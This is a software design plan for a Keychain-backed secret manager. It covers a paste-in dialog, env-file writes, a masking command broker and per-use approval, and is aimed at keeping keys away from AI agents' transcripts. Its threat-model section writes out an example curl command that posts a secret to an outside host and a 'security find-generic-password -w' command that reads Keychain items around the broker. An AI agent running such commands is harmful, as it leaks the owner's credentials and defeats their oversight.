# The vault as a secret manager

A plan, written 2026-11-10 from a read of the tree at `e22642a` —
`shared/secrets.ts`, `shared/vault.ts`, `server/src/secrets.ts`,
`server/src/vault.ts`, `server/src/vaultview.ts`, `server/src/config.ts`,
the stored-credential modules, the harness's MCP endpoint and the `slot`
CLI — and from trying `/usr/bin/security` against a throwaway keychain. It
is built in the same session, in the order at the end, one commit each.

**The ask, in the owner's words (2026-11-10):** "I have two keys, a public
and a private one. Show me the dialogue and place the keys, and then you
underneath put them wherever they need to be without actually reading them.
So it's a safe thing. But for me, the UI is just easier. … a floating
dialogue with the inputs there … the public goes here, I just paste it, the
private goes here, I just paste it, and I put save, and then it goes
wherever it needs to go." And, from 2026-11-01: the vault becomes an
internal secret manager, on the Mac's Keychain rather than crypto of our
own, that Kuru and agents can use without a leaked transcript or backup
giving a value away.

**The first real use:** Pylink's local Bancard staging keys. Pylink reads
`~/.config/pylink-local/env`, whose format and variable names are the Pylink
agent's (PYL-14). Kuru asks for "Bancard staging keys for Pylink" with two
fields, each with a destination; the owner pastes both and presses Save;
each value lands in the Keychain and in its variable in that file; Kuru is
told "saved" or "cancelled" per field and never sees a value.

## In short

- **A vault item** is a name (`pylink/bancard-staging-private`), a label, a
  use rule (free, or ask each time), and a value that lives in the login
  Keychain as a generic password — service `kururu-vault`, account the
  name. Kururu keeps the metadata, never the value, in
  `~/.config/kururu/vault.json`.
- **The dialog** is a floating, centred dialog in every page connected to
  this Mac's server — the window and the phone alike. Kuru opens it with
  `ask_secret`; an agent with `vault ask`. Each field says where its value
  goes: always its Keychain item, and optionally one variable in an env file
  under the home folder. The value goes from the field over the page's
  socket to the server and into the Keychain and the file. The caller hears
  `saved`, `skipped`, `cancelled` or `failed: <why>` per field.
- **The broker** is `vault run`: one command, run by the server, with the
  named items in that command's environment (or answered to `sudo -A`
  through an askpass), its output streamed back with every value masked,
  and every use written to a log: who, which items, what command, where,
  when, the exit code, and who approved it.
- **Approval** is a setting per item: `free`, or `ask`, where each use waits
  for the owner to press Allow in the same kind of dialog. Names that say
  sudo or production default to ask, and the owner can change any of them in
  the dialog that saves it or in Settings → Vault.
- **The existing keys** — OpenRouter, Telegram, Firecrawl and the web
  providers, the Claude tokens made for lending — move into the Keychain on
  the Mac, behind the one function every reader and the lending already go
  through, so neither changes. A Linux node keeps `0600` files.

## What it protects, and what it does not

Be plain about this first, because the shape of everything else follows
from it.

**It protects against accidents.** The leaks that actually happen are a
value pasted into a chat and kept in a transcript, a value an agent printed
and the model read and repeated, a key in a file that a backup or a sync
carried off the machine, a log line, a screen recording, somebody reading
over a shoulder. After this:

| Where a value could have ended up | What stops it |
|---|---|
| Kuru's or an agent's context, and so its transcript (`~/.claude/projects`, Codex's rollouts) | The value is typed into the dialog, not into a chat. The tool's answer is a word per field. `vault run` masks every value in what the command prints. |
| Kururu's database (the drawer, the boards, the usage ledger) and so the backup | Nothing that holds a value is a message, a card or a turn. |
| The backup's mirror | `vault.json` and the use log hold no value; the backup is an allow-list (`shared/backup.ts`) and neither is on it anyway. The Keychain is not a file kururu copies. |
| A file at rest | The Keychain is encrypted with the login password. An env file the owner asked for is still a plain `0600` file, as it was before: that is the program's format, not ours. |
| Logs (`lifecycle.log`, the server's stderr, `ptyhost.log`) | No code path formats a value. Errors from `security` are reduced to an exit code; errors writing an env file name the file and the variable. A test greps the server's output for the values it used. |
| The process table | Values never go on a command line. `security` is fed the item on its stdin (`security -i`); a command under `vault run` gets them in its environment. |
| The screen | Fields are masked, with a show toggle per field that starts hidden and is never remembered. |

**It does not contain an agent that means harm, and it cannot.** An agent
runs as the owner, with the owner's files and network. Specifically:

- **A command run with a secret can send it anywhere.** `vault run --secret
  X -- curl -d "$X" https://elsewhere` sends it, and masking the output does
  nothing about that. Nor does masking catch a value the command transforms
  first (reversed, split, encrypted); it masks the value itself, its base64
  and its URL-encoding.
- **The Keychain item can be read around the broker.** An item created by
  `/usr/bin/security` trusts `/usr/bin/security`, so any process running as
  the owner — an agent included — can run `security find-generic-password
  -s kururu-vault -a <name> -w` and print it, with no prompt. Approval
  governs the door kururu offers, not the Keychain behind it. Going around
  the door is a deliberate act, not an accident, and an agent is told never
  to do it; but nothing enforces that.
- **An env file is a plain file.** Whatever the program reads, any process
  can read.

So encryption is not the answer to a misbehaving agent, and this plan does
not pretend it is. The answer is **narrow, short-lived keys** — a staging key
rather than production's, a token scoped to one repository, rotated after a
job — and **approval** for the ones that would hurt, so a use of a
production key or a sudo password is something the owner sees and allows
one at a time. The log is there to make a use visible after the fact.

What would close the gap around the broker, later and only if wanted: a
small signed helper inside Kururu.app holding the items in the
data-protection keychain under the app's own access group, which no other
program can read without the owner's password. That is native code, a
signing change and a migration; it is noted, not planned.

## Storage

### Today

The vault is not a store yet. Settings → Vault (`server/src/vaultview.ts`)
is a census: it names what kururu and the machine already hold and never
shows a value. What kururu itself keeps are `0600` JSON files in
`~/.config/kururu`, each read per request by its own module through
`readConfigFile` (`server/src/config.ts`):

| File | Secret field | Module | Lent as |
|---|---|---|---|
| `openrouter.json` | `managementKey` | `openrouter.ts` | `openrouter` |
| `telegram.json` | `token` | `telegram.ts` | `telegram` |
| `firecrawl.json` | `apiKey` | `web/providers/firecrawl-cloud.ts` | `firecrawl-cloud` |
| `web-<id>.json` | the provider's key field | `web/providers/*` | `web:<id>` |
| `claude-lend.json` | `tokens.<login>.token` | `secrets.ts` | `claude-token:<login>` |
| `claude-token.json` | `token` (a child's copy) | `logins.ts` | — |
| `access.json` | `token`, the share token | `access.ts`, `localtoken.mjs` | never |
| `node.json`, `nodes.json` | node keys, children's tokens | `nodekeys.ts`, `nodes.ts` | never |

Lending (`server/src/secrets.ts`) reads a kind's source with
`readConfigFile(spec.source.file)`, takes the secret part (`extract`),
seals it to the child, and the child writes it as the same file with
`writeConfigFile`. A project's own secrets — env files, ssh keys, a gh
login — are read where they already live and are not kururu's to move.

### New items

A **vault item** is a generic password in the login Keychain: service
`kururu-vault`, account the item's name, label `kururu: <label>`.

- **Names** are `[a-z0-9][a-z0-9._-]*` in up to four `/`-separated parts,
  64 characters in all: `pylink/bancard-staging-public`. A name is chosen by
  the caller, shown in the dialog, and is how a command asks for it.
- **Writing** is `security -i` with the line `add-generic-password -U -s
  kururu-vault -a <name> -l <label> -X <hex>` on its stdin. `-X` takes the
  data as hex, so no quoting can break the line and nothing is on argv. One
  line of `security -i` holds about 4 KB, so the data is kept under 1800
  bytes a line.
- **Reading** is `find-generic-password -s kururu-vault -a <name> -w`, which
  prints the data — except that `security` prints anything that is not
  printable ASCII as hex, with nothing to say it did. So a value that is
  printable ASCII and short is stored as itself, and anything else (a
  newline, a non-ASCII letter in a sudo password, a PEM key of 3 KB) is
  stored as `kururu-b64:` and its base64, split over items `<name>`,
  `<name>#1`, `<name>#2`… when it is long. A value of up to 64 KB is held.
  Both were tried against a throwaway keychain before this was written.
- **Metadata** — label, use rule, where it was last written to, when it was
  made and changed, who asked — is `~/.config/kururu/vault.json`, `0600`, no
  value in it. It is on `NEVER_SHARED`'s side of the lending test only in the
  sense that it is never lent; it holds nothing secret and could go in the
  backup, but is left out of it so the backup's rule stays "nothing about
  secrets".
- **Removing** an item deletes its Keychain items and its row. An env file
  it was written to is left alone and the page says so.

### The Mac's existing keys, moved in

One function decides, and every reader keeps calling what it calls today.
`writeConfigFile(file, value)` for one of the files above, on a Mac, puts
the secret field in the Keychain (service `kururu-config`, account
`<file>:<field path>`) and writes the file with a marker in its place:
`"managementKey": "kururu-keychain:<digest>"`. `readConfigFile(file)` puts
the value back in the object it returns when it sees a marker. So
`openrouter.ts`, `telegram.ts`, the providers, the lending's `readSource`
and `vaultview.ts`'s hints read exactly what they read now; the file's
settings stay a file, readable and backed up where they were.

- **When:** at the server's start, each listed file that still holds a value
  in the clear is moved, once, and read back to compare before the file is
  rewritten. A failure — a locked Keychain, `security` missing — leaves the
  file as it is and says so in the log, by file name.
- **The digest** in the marker is of the value, so the in-memory copy kept
  to spare a `security` call per request (Telegram reads its token each
  poll) is dropped by any write, which changes the marker.
- **Not moved:** `access.json`, because the CLIs and hooks
  (`localtoken.mjs`) read it in other processes, some on a child with no
  Keychain; and the node keys in `node.json` and `nodes.json`, because a
  missing node key is a node that cannot link, and a Keychain that is
  locked at boot would be exactly that. Both stay `0600` files and the plan
  leaves them there until there is a reason.
- **Lending is unchanged:** the parent reads through `readConfigFile` and
  seals what it reads; the child writes through `writeConfigFile`, which on
  Linux is the file it always was.
- **Going back:** an older kururu reading a moved file would see a marker
  where a key was. `bun run vault --to-files` (the CLI) puts every moved
  value back in its file, for a downgrade. Stated in the CHANGELOG.

### Linux nodes

A Linux node has no Keychain. Its items and lent keys stay `0600` files in
`~/.config/kururu`, as lent secrets are today: `vault.json` holds the
metadata and `vault/<name>` the value, `0600` under a `0700` folder. That
protects against a backup and a transcript, which is the threat that
matters, and not against a thief with the disk, for which the answer is the
disk's own encryption. `secret-tool` (libsecret) wants a desktop session's
keyring that a headless box does not run; `systemd-creds` can encrypt to the
machine's key for a user since systemd 256 and is the candidate when a node
wants more. The store is one interface with two backends, so that is a file
change, not a redesign. A dialog on a node writes to that node's store.

## The dialog

### Who opens it

- **Kuru**, with `ask_secret` in the kururu MCP (`shared/harness.ts`): a
  title, a reason, and fields. It waits for the answer up to nine minutes
  (the MCP call's limit); after that it returns the ask's id and "still
  open", and `ask_secret` with `ask: <id>` waits again.
- **An agent**, with `vault ask` — a CLI written to
  `~/.local/state/kururu/bin/vault` on each start, as `slot` is — which
  speaks to `POST /api/vault/ask` on loopback and waits. It is how the
  Pylink agent asks itself, without Kuru in between.

A field is:

```json
{ "label": "Private key", "name": "pylink/bancard-staging-private",
  "env": { "file": "~/.config/pylink-local/env", "variable": "BANCARD_PRIVATE_KEY" },
  "use": "ask" }
```

`env` and `use` are optional. Up to eight fields. Checked before the dialog
opens, so a bad path is the caller's error and never the owner's surprise.

### What it looks like

A centred card over everything, in the window and on the phone: the title,
the reason, who asked ("Kuru", or the agent by its name), and per field the
label, a masked input with an eye to show it, and under it where it goes —
"Keychain · pylink/bancard-staging-private" and "→ BANCARD_PRIVATE_KEY in
~/.config/pylink-local/env" — and, for a new item, its use rule as a small
switch ("ask me each time it is used"). Save and Cancel. A field left empty
is skipped and said to be. Paste is the input's own. The value is not
remembered by the browser (`autocomplete="off"`, a password field, and the
manager hints off), not put in React state that outlives the dialog, and not
in the page's draft store.

Every page that can see the server shows it; the first Save or Cancel
answers, and the others close. An ask the owner has not answered in fifteen
minutes closes itself as cancelled. While it is up, no key reaches a
terminal, as with every dialog (`Dialog.tsx`).

### The phone

It works. The phone loads the page from this Mac's server over the tailnet,
so what is typed travels inside Tailscale's WireGuard tunnel, from the
phone straight to the Mac, behind the same share token as everything else;
nothing about it is plain on any network. What the phone lacks — a secure
context — matters to the microphone and the clipboard API, not to a paste
into a field, which is the operating system's. A phone connected to another
node sees that node's asks only; an ask is the node's whose server opened it.

### Where a value goes

On Save the server, for each field with a value, in order:

1. writes the Keychain item (the store), and reads it back to compare;
2. if the field has `env`, writes the variable into the file (below);
3. records the item in `vault.json` — label, rule, the file and variable it
   was written to, who asked, when — and answers `saved`.

A step that fails answers `failed: <why>` for that field, with no value in
the why, and the next field still goes. The page is told the outcome per
field and shows it before closing, so a failure is seen, not only reported.

**An env file** is written by these rules, in `shared/envfile.ts` (pure) and
`server/src/vaultfile.ts`:

- **Where:** a path under the home folder, `~/…` or absolute, resolved,
  checked, realpath'd and checked again (the `files.ts` rule: refuse, never
  clamp). Not under `~/.ssh`, `~/.config/kururu`, `~/.gnupg`, `~/Library`.
  Not a symlink. Its folder is made `0700` if it is missing.
- **What:** an env file — every line blank, a comment, or `NAME=value` with
  an optional `export `. A file with any other line is refused, so a
  mistyped path at `~/.zshrc` is an error rather than an edit.
- **Back up first:** the file as it was is copied to
  `~/.local/state/kururu/vault/env-backups/` (`0700`), `0600`, named by a
  hash of its path and the time; the five newest per file are kept. Not
  beside the file, where a project's `.gitignore` might not cover it.
- **Replace only the named variable:** every line that sets it is replaced
  in place, keeping its `export `; a variable that is not there is appended.
  Nothing else in the file changes, byte for byte.
- **Quote** only as needed: bare when the value is letters, digits and
  `_./:+=@,-`; single quotes when it holds no `'`; otherwise double quotes
  with `\`, `"`, `$` and `` ` `` escaped. A value with a newline is refused
  for an env file (it is still saved to the Keychain).
- **Mode** `0600`, written beside itself and renamed in.

The variable's name is the caller's, so it must be `[A-Za-z_][A-Za-z0-9_]*`.

## Using a secret without reading it

`vault run` is the one door:

```sh
vault run --secret pylink/bancard-staging-private=BANCARD_PRIVATE_KEY -- bun run smoke
vault run --askpass deck/sudo -- ssh deck sudo -A systemctl restart thing   # later; see below
vault list
```

- **The server runs the command**, not the CLI, so the CLI never holds a
  value and there is no endpoint that hands one out. The CLI sends its argv,
  its working directory and its environment; the server checks the agent
  (`KURURU_AGENT_ID`, believed only if that agent exists), asks for approval
  when an item's rule says to, reads the items, starts the command in its
  own process group with the values added to the environment, and streams
  stdout and stderr back masked. The CLI exits with the command's code. A
  CLI that hangs up (Ctrl-C, the agent stopped) ends the process group.
  stdin is not passed: these are commands, not sessions.
- **Masking** replaces each value, its base64 and its URL-encoding with
  `[vault:<name>]`, holding back the last bytes of each chunk until the next
  one so a value split across two reads is still caught.
- **sudo:** `--askpass <name>` sets `SUDO_ASKPASS` to
  `~/.local/state/kururu/bin/vault-askpass` and gives the command a one-use
  ticket in its environment. sudo runs the askpass, which trades the ticket
  for the value with the server and prints it to sudo, not to the command's
  output; the ticket answers three times at most and dies with the run.
  The value is never in the command's environment.
- **The log** is `~/.local/share/kururu/vault-uses.jsonl`: time, who (agent
  id and name, or Kuru, or "a shell" for a caller with no agent), the items,
  the command as given (clipped at 500 characters — it is the caller's text,
  never a value, but a careless caller could put one there, so the page
  shows it and Settings can clear it), the folder, approved by (`free`, or
  `owner` with the time), the exit code and how long it ran. Not in the
  backup. The last fifty show in Settings → Vault.

**Kuru** uses the same CLI from its own shell; it gets no MCP tool to run a
command with a secret, because it already runs commands. It gets
`ask_secret` and `list_secrets` (names, labels, rules, where each was
written; never a value).

**What an agent is told:** the tool descriptions and the CLI's `--help` say
to use `vault run`, never to read the Keychain or print an env file's
values, and that the item names are the interface.

### The Steam Deck, later

The Deck is a machine: an ssh host with no kururu. Its sudo password is an
item (`deck/sudo`, rule `ask`). The shape is `vault run --askpass deck/sudo
-- ssh -t deck …`, which does not work as written — sudo on the Deck runs
its askpass on the Deck. The plan for it is a machine verb that pipes the
value into `sudo -S` on the Deck's stdin over the machine's ssh connection,
with the same approval and log. Out of this build; noted so the item shape
is right for it.

## Approval

An item's `use` is `free` or `ask`.

- **Default:** `ask` for a name or label that says `sudo`, `prod`,
  `production` or `live`; `free` otherwise. The caller may ask for `ask`; the
  owner decides in the dialog (the switch beside the field) and later in
  Settings → Vault. A caller cannot make an item `free` on its own.
- **Asking:** a use of an `ask` item opens the same floating dialog with no
  fields: who, which items, the command, the folder. **Allow once**,
  **Allow this agent for 15 minutes**, **Deny**. Unanswered in five minutes
  is denied. The CLI waits and says it is waiting.
- **Recorded:** the log says who allowed it and when; a fifteen-minute
  allowance is per agent, per item, in memory, and ends on a server restart.

## Settings → Vault

The page keeps its census and gains a section above it, **Kept in the
vault**: each item by label and name, where it lives (Keychain, or a file on
Linux), the env files it was last written to, its rule as a switch, when it
was last used and by whom, and Remove. Below the census, **Recent uses**,
the last fifty lines of the log, with Clear.

## Files

| File | What |
|---|---|
| `shared/vaultitems.ts` | names, fields, rules, the ask and answer shapes, the defaults, the use log's line. Pure. |
| `shared/envfile.ts` | reading an env file's shape, replacing one variable, quoting. Pure. |
| `shared/mask.ts` | the streaming masker. Pure. |
| `server/src/keychain.ts` | `security` on the Mac, files on Linux: put, get, remove, exists. |
| `server/src/vaultstore.ts` | items and `vault.json`, the asks and their timers, approvals, runs and the log. |
| `server/src/vaultfile.ts` | the env file's path checks, backup and write. |
| `server/src/vault-cli.ts` | `vault`: ask, run, list, askpass, `--to-files`. Bundled to `dist/vault.mjs`. |
| `server/src/http/vault.ts` | `/api/vault/ask`, `/run`, `/askpass`, `/list`. Loopback only. |
| `web/src/components/VaultAsk.tsx` | the dialog, for an ask and for an approval. |
| `web/src/settings/Vault.tsx` | the new sections. |

`server/src/config.ts` gains the Keychain field rule (step 5).

## Order

Each step is a commit, pushed after a pull. None of them touches the pty
host.

1. **This plan.**
2. **The dialog**, with the Keychain and env-file destinations, `ask_secret`
   and `list_secrets` for Kuru, and `vault ask` and `vault list` for agents,
   so the Bancard case works first.
3. **The broker:** `vault run`, masking, the askpass, the log.
4. **Approval:** the rule, the dialog, Settings → Vault's switches and
   recent uses.
5. **The existing keys into the Keychain**, through `config.ts`, and `vault
   --to-files`.

What each costs the running app: steps 2–5 change `shared/`, `server/src/`
and `web/`, which is a reconnect and a window reload, and a `desktop/`
rebuild only because the CLI bundle is new (`dist/vault.mjs`) — a server run
from the checkout writes `bin/vault` pointing at the checkout's build. No
host restart.
